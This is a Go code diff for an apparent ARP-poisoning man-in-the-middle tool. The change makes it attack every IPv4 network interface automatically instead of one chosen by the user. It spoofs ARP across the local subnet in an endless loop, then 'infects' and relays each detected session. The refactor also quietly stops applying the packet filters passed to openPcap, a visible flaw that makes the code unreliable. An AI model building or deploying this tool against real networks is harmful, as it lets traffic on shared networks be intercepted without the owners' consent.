@@ -8,6 +8,7 @@ import (
 	"net"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/google/gopacket"
@@ -43,54 +44,69 @@ var (
 	broadcast = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	zerofill  = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
 
-	device pcap.Interface
+	wsCh = make(chan string)
 )
 
 func main() {
-	device = selectDeviceFromUser()
+	go serve()
 
-	attacker := &Host{}
-	attacker.getLocalhostInfomation(device)
+	wg := new(sync.WaitGroup)
+	for _, device := range findAllAbleDevs() {
+		attacker := &Host{}
+		attacker.getLocalhostInfomation(device)
+		if len(attacker.MAC) == 0 {
+			continue
+		}
 
-	go parse(device)
+		go parse(device)
 
-	for session := range attacker.getSessionChan() {
-		log.Println("Session Detected.", session)
-		handle := openPcap(device, "ip")
-		go session.infect(handle, attacker)
-		go session.relay(handle, attacker)
+		sessionCh, err := attacker.getSessionChan(device)
+		if err != nil {
+			log.Println(device.Name, err)
+			continue
+		}
+
+		wg.Add(1)
+		go func(device pcap.Interface, sessionCh chan *Session) {
+			defer wg.Done()
+			for session := range sessionCh {
+				log.Println("Session Detected.", session)
+				handle, err := openPcap(device, "ip")
+				if err != nil {
+					log.Println(err)
+					return
+				}
+				go session.infect(handle, attacker)
+				go session.relay(handle, attacker)
+			}
+		}(device, sessionCh)
 	}
+	wg.Wait()
 }
 
-func selectDeviceFromUser() pcap.Interface {
+func findAllAbleDevs() (ret []pcap.Interface) {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Println(">> Please select the network card to sniff packets.")
-	for i, device := range devices {
-		fmt.Printf("\n%d. Name : %s\n   Description : %s\n   IP address : %v\n",
-			i+1, device.Name, device.Description, device.Addresses)
+	for _, device := range devices {
+		ok := false
+		for _, addr := range device.Addresses {
+			if len(addr.IP) == 4 {
+				ok = true
+				break
+			}
+		}
+		if !ok {
+			continue
+		}
+		ret = append(ret, device)
 	}
-	var selected int
-	fmt.Print("\n>> ")
-	fmt.Scanf("%d", &selected)
-	if selected < 0 || selected > len(devices) {
-		log.Panic("Invaild Selected.")
-	}
-	return devices[selected-1]
+	return
 }
 
-func openPcap(device pcap.Interface, filter string) *pcap.Handle {
-	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
-	if err != nil {
-		log.Fatal(err)
-	}
-	err = handle.SetBPFFilter(filter)
-	if err != nil {
-		log.Fatal(err)
-	}
-	return handle
+func openPcap(device pcap.Interface, filter string) (*pcap.Handle, error) {
+	return pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
 }
 
 func (h *Host) getLocalhostInfomation(device pcap.Interface) {
@@ -125,14 +141,14 @@ func (h *Host) getLocalhostInfomation(device pcap.Interface) {
 }
 
 // only work on C class
-func (h *Host) getSessionChan() (ch chan *Session) {
-	ch = make(chan *Session)
+func (h *Host) getSessionChan(device pcap.Interface) (chan *Session, error) {
+	ch := make(chan *Session)
 	prefixSize, _ := net.IPMask(h.Netmask).Size()
 	cidr := net.IP(h.IP).String() + "/" + strconv.Itoa(prefixSize)
 	ip, ipnet, err := net.ParseCIDR(cidr)
 	if err != nil {
 		close(ch)
-		return
+		return nil, err
 	}
 	inc := func(ip net.IP) {
 		for i := len(ip) - 1; i >= 0; i-- {
@@ -154,11 +170,14 @@ func (h *Host) getSessionChan() (ch chan *Session) {
 
 	hostInNetwork = hostInNetwork[1 : len(hostInNetwork)-1]
 
-	handle := openPcap(device, "arp")
+	handle, err := openPcap(device, "arp")
+	if err != nil {
+		return nil, err
+	}
 	go recvARP(handle, hostInNetwork, ch)
 	go h.infinitySendARP(handle, hostInNetwork)
 
-	return
+	return ch, nil
 }
 
 func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
